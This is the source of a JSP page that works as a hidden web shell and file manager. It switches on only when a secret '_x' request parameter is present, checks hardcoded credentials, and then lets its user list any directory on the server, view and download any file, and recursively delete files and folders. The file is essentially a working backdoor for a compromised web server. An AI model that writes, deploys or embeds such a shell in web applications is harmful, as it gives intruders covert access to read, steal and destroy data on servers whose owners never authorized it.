<%@ page trimDirectiveWhitespaces="true" %>
<%@ page import="org.w3c.dom.Document" %>
<%@ page import="org.w3c.dom.Element" %>
<%@ page import="javax.xml.parsers.DocumentBuilder" %>
<%@ page import="javax.xml.parsers.DocumentBuilderFactory" %>
<%@ page import="javax.xml.parsers.ParserConfigurationException" %>
<%@ page import="javax.xml.transform.Transformer" %>
<%@ page import="javax.xml.transform.TransformerException" %>
<%@ page import="javax.xml.transform.TransformerFactory" %>
<%@ page import="javax.xml.transform.dom.DOMSource" %>
<%@ page import="javax.xml.transform.stream.StreamResult" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.UnsupportedEncodingException" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.*" %>
<%!
    public static final class Config {
        public static final String USER = "laohu";
        public static final String PASSWORD = "laohu";
        public static final int BLOCKING_TIME = 30; // seconds
        public static final int MAX_FAIL = 5;
    }

    public boolean onService(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletContext application, ServletConfig config, JspWriter out) throws IOException, ServletException {
        Shell shell = new Shell(request, response, session, context, application, config, out);
        return shell.run();
    }

    public static class Shell {
        private HttpServletRequest request;
        private HttpServletResponse response;
        private HttpSession session;
        private JspContext context;
        private ServletContext application;
        private ServletConfig config;
        private JspWriter out;
        private int code = 403;
        private String message = "Unauthorized";
        private HashMap<String, Object> data = new HashMap<String, Object>();

        public Shell(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletContext application, ServletConfig config, JspWriter out) {
            this.request = request;
            this.response = response;
            this.session = session;
            this.context = context;
            this.application = application;
            this.config = config;
            this.out = out;
        }

        public boolean run() {
            boolean ret = shouldInShell();
            if (ret) {
                //
                internalRun();
                data.put("breadcrumb", getBreadCrumb(data.get("pwd").toString()));
                if (code > 0) {
                    output(code, message, data);
                }
            }
            return ret;
        }

        protected void internalRun() {
            if (!isLogined()) {
                if (isInLogin()) {
                    inDoLogin();
                    return;
                }
                return;
            } else {
                code = 200;
                message = "OK";
                data.put("username", session.getAttribute("_user"));
                data.put("pwd", getPWD());
            }

            String action = getParam("_a", null);

            if ("logout".equals(action)) {
                session.invalidate();
                code = 200;
                message = "OK";
                return;
            }

            if ("files".equals(action)) {
                String from = getParam("from", null);
                String path = getParam("path", getPWD());
                String pwd = resovlePath(path, from);
                File file = new File(pwd);
                while (file != null && (!file.exists() || !file.isDirectory())) {
                    file = file.getParentFile();
                    pwd = getPWD();
                }
                if (file != null) {
                    pwd = file.getAbsolutePath();
                }
                data.put("files", listFiles(pwd));
                data.put("pwd", pwd);
                code = 200;
                message = "OK";
                return;
            }

            if ("view".equals(action) || "download".equals(action)) {
                String path = getParam("path", null);
                code = -1;
                try {
                    if (path == null) {
                        out.println("No file specified.");
                        return;
                    }
                    path = resovlePath(path, getPWD());
                    File file = new File(path);
                    if (!file.exists() || file.isDirectory()) {
                        out.println(String.format("\"%s\" is not a file.", path));
                        return;
                    }
                    String contentType = getMimeType(file.getAbsolutePath());
                    response.setContentType(contentType);
                    response.setContentLengthLong(file.length());
                    if ("download".equals(action) || contentType.startsWith("application/")) {
                        response.setHeader("Content-Disposition", "attachment;filename=\"" + file.getName() + "\";filename*=UTF-8''" + URLEncoder.encode(file.getName(), "utf-8"));
                    }
                    out.clearBuffer();
                    response.resetBuffer();
                    Files.copy(Paths.get(file.getAbsolutePath()), response.getOutputStream());
                } catch (IOException e) {
                    e.printStackTrace();
                }

                return;
            }

            if ("delete".equals(action)) {
                String path = getParam("path", null);
                if (path == null) {
                    data.put("empty-path", "");
                    code = 401;
                    message = "Deletion failed.";
                    return;
                }
                path = resovlePath(path, getPWD());
                File file = new File(path);
                if (!file.exists()) {
                    data.put("file-not-exists", "");
                    code = 401;
                    message = "Deletion failed.";
                    return;
                }
                try {
                    Stack<File> stack = new Stack<File>();
                    stack.push(file);
                    boolean ret = true;
                    File[] currList = null;
                    int fileCount = 0;
                    int folderCount = 0;
                    while (!stack.isEmpty()) {
                        if (!ret) {
                            break;
                        }

                        if (stack.lastElement().isDirectory()) {
                            currList = stack.lastElement().listFiles();
                            if (currList.length > 0) {
                                for (File curr : currList) {
                                    stack.push(curr);
                                }
                            } else {
                                ret = stack.pop().delete() && ret;
                                if (ret) {
                                    ++folderCount;
                                }
                            }
                        } else {
                            ret = ret && stack.pop().delete();
                            if (ret) {
                                ++fileCount;
                            }
                        }
                    }
                    //boolean ret = file.delete();
                    if (ret) {
                        code = 200;
                        message = "Deleteion success.";
                        data.put("file-count", fileCount);
                        data.put("dir-count", folderCount);
                        return;
                    }
                    code = 401;
                    message = "Deletion failed.";
                    data.put("access-denied", "");
                    return;
                } catch (SecurityException e) {
                    code = 401;
                    message = "Deletion failed.";
                    data.put("access-denied", "");
                    return;
                }
            }

            if ("create".equals(action)) {
                String pwd = getPWD();
                String name = getParam("name", null);
                String type = getParam("type", "file");
                Paths.get(pwd, name);
                return;
            }
        }


        public String resovlePath(String path, String pwd) {
            path = path.replaceFirst("^~", System.getProperty("user.home", "/"));
            if (pwd != null) {
                assert pwd.startsWith("/");
                File dir = new File(pwd).getParentFile();
                if (dir != null) {
                    path = path.replaceFirst("^\\..", dir.getAbsolutePath());
                }
                path = path.replaceFirst("^\\.", pwd);
            }
            return path;
        }

        public boolean shouldInShell() {
            if (getParam("_x", null) != null) {
                return true;
            }
            return false;
        }

        public String getParam(String name, String defaultValue) {
            String value = request.getParameter(name);
            return value == null ? defaultValue : value;
        }

        protected String getMimeType(String path) {
            try {
                Class.forName("javax.activation.MimetypesFileTypeMap");
                javax.activation.MimetypesFileTypeMap map = new javax.activation.MimetypesFileTypeMap();
                map.addMimeTypes("text/plain log LOG txt TXT md MD ini INI inf INF conf CONF");
                map.addMimeTypes("text/javascript js JS json JSON");
                map.addMimeTypes("text/css css CSS");
                map.addMimeTypes("text/xml xml XML mxml MXML");
                map.addMimeTypes("image/png png PNG");
                map.addMimeTypes("image/tiff tiff TIFF");
                return map.getContentType(path);
            } catch (ClassNotFoundException e) {
                // noop
            }

            try {
                return Files.probeContentType(Paths.get(path));
            } catch (IOException e) {
                //e.printStackTrace();
            }

            return "application/octet-stream";
        }

        protected String getUrl(String action, String path) {
            StringBuffer sb = request.getRequestURL();
            sb.append("?_x=1&_a=");
            try {
                sb.append(URLEncoder.encode(action, "utf-8"));
                sb.append("&path=");
                sb.append(URLEncoder.encode(path, "utf-8"));
            } catch (UnsupportedEncodingException e) {
                //e.printStackTrace();
                sb.append(action);
                sb.append("&path=");
                sb.append(path);
            }
            return sb.toString();
        }

        public boolean isLogined() {
            return Config.USER.equals(session.getAttribute("_user"));
        }

        public boolean isInLogin() {
            return request.getMethod().toUpperCase().equals("POST") && "login-form".equals(request.getParameter("form-name"));
        }

        public int getBlockTime() {
            String key = "_blockUtil_" + request.getRemoteAddr();
            Long blockUtil = (Long) session.getAttribute(key);
            return blockUtil == null ? 0 : (int) (Math.max(0, blockUtil - System.currentTimeMillis()) / 1000);
        }

        public void setBlock() {
            String key = "_blockUtil_" + request.getRemoteAddr();
            Long blockUtil = System.currentTimeMillis() + Config.BLOCKING_TIME * 1000;
            session.setAttribute(key, blockUtil);
        }

        public int getTryTime() {
            String key = "_tryTime_" + request.getRemoteAddr();
            Integer tryTime = (Integer) session.getAttribute(key);
            return tryTime == null ? 0 : tryTime;
        }

        public void setTryTime(int tryTime) {
            String key = "_tryTime_" + request.getRemoteAddr();
            session.setAttribute(key, tryTime);
        }

        protected List<HashMap<String, String>> getBreadCrumb(String path) {
            ArrayList<HashMap<String, String>> filesList = new ArrayList<HashMap<String, String>>();
            File file = new File(path);
            Stack<File> files = new Stack<File>();
            HashMap<String, String> fileInfo;
            while (file != null) {
                files.add(file);
                file = file.getParentFile();
            }
            while (files.size() > 0) {
                file = files.pop();
                fileInfo = new HashMap<String, String>();
                fileInfo.put("name", file.getName());
                if (file.getParentFile() == null) {
                    fileInfo.put("name", "ROOT");
                }
                fileInfo.put("path", file.getAbsolutePath());
                filesList.add(fileInfo);
            }
            return filesList;
        }

        public void output(int code, String msg, Map<String, Object> data) {
            try {
                response.resetBuffer();
                response.setContentType("application/xml");
                response.setCharacterEncoding("utf-8");

                DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
                DocumentBuilder builder = builderFactory.newDocumentBuilder();
                Document doc = builder.newDocument();
                //build dom
                Element codeElement = doc.createElement("code");
                Element root = doc.createElement("result");
                doc.appendChild(root);
                root.appendChild(codeElement);
                codeElement.setTextContent(String.valueOf(code));
                Element messageElement = doc.createElement("message");
                root.appendChild(messageElement);
                messageElement.setTextContent(msg);
                Element dataElement = createElement(doc, "data", data);
                root.appendChild(dataElement);
                //
                //transform
                TransformerFactory transformerFactory = TransformerFactory.newInstance();
                Transformer transformer = transformerFactory.newTransformer();
                DOMSource domSource = new DOMSource(doc);
                StreamResult streamResult = new StreamResult(out);
                transformer.transform(domSource, streamResult);
            } catch (TransformerException e) {
                e.printStackTrace();
                return;
            } catch (ParserConfigurationException e) {
                e.printStackTrace();
                return;
            }
        }

        protected Element createElement(Document doc, String name, Object value) {
            Element element = doc.createElement(name);
            Class clazz = value.getClass();
            if (clazz.isArray()) {
                element.setAttribute("type", "array");
                Object[] items = (Object[]) value;
                for (Object item : items) {
                    element.appendChild(createElement(doc, "item", item));
                }
            } else if (List.class.isAssignableFrom(clazz)) {
                element.setAttribute("type", "array");
                List<Object> items = (List<Object>) value;
                for (Object item : items) {
                    element.appendChild(createElement(doc, "item", item));
                }
            } else if (Map.class.isAssignableFrom(clazz)) {
                element.setAttribute("type", "map");
                Map<Object, Object> map = (Map<Object, Object>) value;
                for (Map.Entry entry : map.entrySet()) {
                    element.appendChild(createElement(doc, entry.getKey().toString(), entry.getValue()));
                }
            } else {
                element.setTextContent(value.toString());
            }
            return element;
        }

        public void inDoLogin() {
            //System.out.println("inLogin");
            String userName = getParam("userName", "").trim();
            String password = getParam("password", "").trim();
            if (userName.length() == 0 || password.length() == 0) {
                data.put("empty-input", "");
                return;
            }
            if (!checkCanLogin()) {
                return;
            }
            if (Config.USER.equals(userName) && Config.PASSWORD.equals(password)) {
                data.put("username", userName);
                code = 200;
                message = "OK";
                session.setAttribute("_user", Config.USER);
                return;
            }
            onLoginFailed();
        }

        protected boolean checkCanLogin() {
            int blockTime = getBlockTime();
            boolean ret = blockTime > 0;
            if (ret) {
                data.put("block-time", blockTime);
            }
            return !ret;
        }

        protected void onLoginFailed() {
            data.put("not-match", 1);
            int tryTime = getTryTime();
            ++tryTime;
            data.put("try-time", tryTime);
            if (tryTime >= Config.MAX_FAIL) {
                setBlock();
                data.remove("try-time");
                tryTime = 0;
                data.put("block-time", getBlockTime());
            }
            setTryTime(tryTime);
            data.put("max-try", Config.MAX_FAIL);
            data.put("block-wait", Config.BLOCKING_TIME);
        }

        protected ArrayList<HashMap<String, String>> listFiles(String path) {
            ArrayList<HashMap<String, String>> files = new ArrayList<HashMap<String, String>>();
            File dir = new File(path);
            HashMap<String, String> fileInfo = null;
            ArrayList<File> filesList = new ArrayList<File>();
            if (dir.isDirectory()) {
                filesList.add(dir);
            }
            if (dir.getParentFile() != null) {
                filesList.add(dir.getParentFile());
            }
            File[] list = dir.listFiles();
            if (list != null) {
                filesList.addAll(Arrays.asList(list));
            }

            for (File file : filesList) {
                fileInfo = new HashMap<String, String>();
                fileInfo.put("name", file.getName());
                if (file.equals(dir)) {
                    fileInfo.put("name", ".");
                }
                if (file.equals(dir.getParentFile())) {
                    fileInfo.put("name", "..");
                }
                fileInfo.put("path", file.getAbsolutePath());
                fileInfo.put("size", String.valueOf(file.length()));
                fileInfo.put("download_url", getUrl("download", file.getAbsolutePath()));
                fileInfo.put("view_url", getUrl("view", file.getAbsolutePath()));
                fileInfo.put("delete_url", getUrl("delete", file.getAbsolutePath()));
                fileInfo.put("type", file.isDirectory() ? "dir" : "file");
                char[] perm = new char[]{'r', 'w', 'x'};
                if (!file.canRead()) {
                    perm[0] = '-';
                }
                if (!file.canWrite()) {
                    perm[1] = '-';
                }
                if (!file.canExecute()) {
                    perm[2] = '-';
                }
                fileInfo.put("perm", String.valueOf(perm));
                files.add(fileInfo);
            }

            return files;
        }

        protected String getPWD() {
            String path = System.getProperty("user.dir", "/");
            path = getParam("path", path);
            //System.out.println(System.getProperty("user.home"));
            path = resovlePath(path, null);
            File file = Paths.get(path).toFile().getAbsoluteFile();
            while (file != null && (!file.isDirectory() || !file.exists())) {
                file = file.getParentFile();
            }
            if (file != null) {
                path = file.getAbsolutePath();
            }
            //Runtime.getRuntime().
            return path;
        }
    }


%>
<%
    if (onService(request, response, session, pageContext, application, config, out)) {
        return;
    }
%>
